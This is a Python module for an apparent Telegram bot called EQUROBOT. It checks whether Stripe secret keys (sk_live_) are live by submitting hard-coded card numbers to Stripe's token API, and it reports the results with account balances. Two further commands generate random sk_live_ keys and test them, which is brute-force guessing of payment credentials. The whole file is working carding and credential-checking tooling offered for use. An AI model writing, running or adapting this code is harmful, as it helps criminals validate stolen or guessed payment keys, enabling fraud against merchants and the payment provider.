import requests
import random
import string
from pyrogram import filters
from EQUROBOT import app as Checker
import time

def check_sk(key):
    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2022&card[cvc]=354'
    start_time = time.time()
    first = requests.post('https://api.stripe.com/v1/tokens', data=data, auth=(key, ' '))
    end_time = time.time()
    duration = end_time - start_time
    status = first.status_code
    f_json = first.json()
    
    currency = f_json.get('currency', 'N/A')
    available_balance = f_json.get('available_balance', 'N/A')
    pending_balance = f_json.get('pending_balance', 'N/A')
    
    if 'error' in f_json:
        if 'type' in f_json['error']:
            type = f_json['error']['type']
        else:
            type = ''
    else:
        type = ''
    
    if status == 200 or type == 'card_error':
        r_text, r_logo, r_respo = 'LIVE KEY ✅', '✅', 'LIVE KEY'
    else:
        if 'error' in first.json():
            if 'code' in first.json()['error']:
                r_res = first.json()['error']['code'].replace('_', ' ').strip()
            else:
                r_res = 'INVALID API KEY'
        else:
            r_res = 'INVALID API KEY'

        r_text, r_logo, r_respo = 'SK KEY DEAD ❌', '❌', r_res
    
    return r_text, r_logo, r_respo, currency, available_balance, pending_balance, duration

@Checker.on_message(filters.command("sk"))
async def sk_checker(_, message):
    data = message.text.split(maxsplit=1)
    if len(data) < 2 or not data[1].startswith('sk_live_'):
        return await message.reply("**ɢɪᴠᴇ ᴍᴇ sᴇɴsᴇɪ ᴏɴʟʏ sᴋ ᴋᴇʏ ᴏᴛʜᴇʀ ᴡɪsᴇ ɪ ᴄᴀɴ ɴᴏᴛ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴋᴇʏ.**")

    r_text, r_logo, r_respo, currency, available_balance, pending_balance, duration = check_sk(data[1])

    text = f"""
┏━━━━━━━⍟
┃{r_text}
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ <code>{data[1]}</code>
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {r_respo}
⊗ 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 : {currency}
⊗ 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {available_balance}
⊗ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {pending_balance}
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺
"""

    await message.reply(text)

@Checker.on_message(filters.command("genskey long"))
async def long_genskey(_, message):
    skkey = random.choice(['sk_live_51H', 'sk_live_51J']) + ''.join(random.choices(string.digits + string.ascii_letters, k=96))
    start_time = time.time()
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    end_time = time.time()
    duration = end_time - start_time

    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined":
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺
""")
    else:
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺
""")

@Checker.on_message(filters.command("genskey short"))
async def short_genskey(_, message):
    skkey = "sk_live_" + ''.join(random.choices(string.digits + string.ascii_letters, k=24))
    start_time = time.time()
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    end_time = time.time()
    duration = end_time - start_time

    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined":
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺
""")
    else:
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺
""")
        
